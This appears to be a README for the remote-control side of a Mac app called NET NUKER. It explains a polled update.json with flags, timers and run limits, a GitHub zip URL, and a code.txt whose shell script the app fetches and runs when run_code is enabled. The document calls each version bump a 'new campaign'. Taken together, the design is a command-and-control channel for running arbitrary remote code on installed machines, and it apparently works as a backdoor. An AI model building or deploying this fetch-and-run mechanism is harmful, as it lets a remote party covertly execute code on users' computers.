# NET NUKER remote controls

| File | Purpose |
|------|---------|
| `update.json` | Flags + timers (app polls this) |
| `code.txt` | Shell script body when `run_code` is true |

## `update.json`

```json
{
  "version": "1.0.1",
  "url": "https://github.com/XD42343223423/update/raw/main/net-nuker.zip",
  "run_code": false,
  "check_every": 1,
  "timer": 60,
  "max_runs": 1
}
```

| Field | Meaning |
|-------|---------|
| `run_code` | `false` = never run `code.txt`. `true` / `yes` / `1` = allow runs |
| `check_every` | How often (seconds) the app re-reads this JSON (default **1**) |
| `timer` | Minimum seconds **between** actual `code.txt` executions |
| `max_runs` | How many times `code.txt` may run total (**1** = once, then stop). `0` = unlimited |
| `version` | Bump this to **reset** the local run counter (new campaign) |

## Local state (on the Mac)

Stops infinite loops. Stored at:

`/tmp/netnuker_remote_tick.json`

```json
{
  "runs": 1,
  "max_runs": 1,
  "last_run": 1721400000,
  "code_hash": "abc123…",
  "version": "1.0.1"
}
```

When `runs >= max_runs`, code will not run again until you raise `max_runs` or bump `version`.

## Safe default

Keep **`run_code": false`** unless you intentionally want a one-shot remote job.
